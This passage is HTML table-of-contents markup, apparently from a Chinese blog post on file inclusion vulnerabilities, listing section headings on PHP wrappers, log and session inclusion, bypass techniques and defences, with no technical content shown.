class="post-toc-text">asp文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#aspx文件包含漏洞"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">aspx文件包含漏洞</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#相关函数"><span class="post-toc-number">1.</span> <span class="post-toc-text">相关函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#以上前4个函数的区别"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">以上前4个函数的区别</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#file-get-contents"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">file_get_contents()</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#test1"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">test1</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分类"><span class="post-toc-number">2.</span> <span class="post-toc-text">分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#LFI-Local-File-Inclusion"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">LFI(Local File Inclusion)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RFI-Remote-File-Inclusion"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">RFI(Remote File Inclusion)</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#包含技巧"><span class="post-toc-number">3.</span> <span class="post-toc-text">包含技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php伪协议"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">php伪协议</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php-input"><span class="post-toc-number">3.1.1.</span> <span class="post-toc-text">php://input</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#php-filter"><span class="post-toc-number">3.1.2.</span> <span class="post-toc-text">php://filter</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#phar"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">phar://</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#使用phar-拓展php反序列化攻击面"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">使用phar://拓展php反序列化攻击面</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#zip"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">zip://</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#data-URL-schema"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">data:URL schema</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#data-text-plain"><span class="post-toc-number">3.4.1.</span> <span class="post-toc-text">data:text/plain</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#data-text-plain-base64"><span class="post-toc-number">3.4.2.</span> <span class="post-toc-text">data:text/plain;base64</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含session"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">包含session</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含日志"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">包含日志</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#访问日志"><span class="post-toc-number">3.6.1.</span> <span class="post-toc-text">访问日志</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SSH-log"><span class="post-toc-number">3.6.2.</span> <span class="post-toc-text">SSH log</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含environ"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">包含environ</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含fd"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">包含fd</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含临时文件"><span class="post-toc-number">3.9.</span> <span class="post-toc-text">包含临时文件</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#绕过技巧"><span class="post-toc-number">4.</span> <span class="post-toc-text">绕过技巧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#指定前缀"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">指定前缀</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#目录遍历"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">目录遍历</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码绕过"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">编码绕过</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#指定后缀"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">指定后缀</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#URL"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">URL</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#利用协议"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">利用协议</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#长度截断"><span class="post-toc-number">4.2.3.</span> <span class="post-toc-text">长度截断</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0字节截断"><span class="post-toc-number">4.2.4.</span> <span class="post-toc-text">0字节截断</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#防御手法"><span class="post-toc-number">5.</span> <span class="post-toc-text">防御手法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#利用-proc-self-environ进行包含"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">利用/proc/self/environ进行包含</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含session文件"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">包含session文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#包含其他由php创建的tmp文件"><span class="post-toc-number">5.4.</span> <span class="post-toc-text">包含其他由php创建的tmp文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#jsp文件包含漏洞"><span class="post-toc-number">5.5.</span> <span class="post-toc-text">jsp文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#asp文件包含漏洞"><span class="post-toc-number">5.6.</span> <span class="post-toc-text">asp文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#aspx文件包含漏洞"><span class="post-toc-number">5.7.</span> <span class="post-toc-text">aspx文件包含漏洞</span></a></li></ol></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </aside>
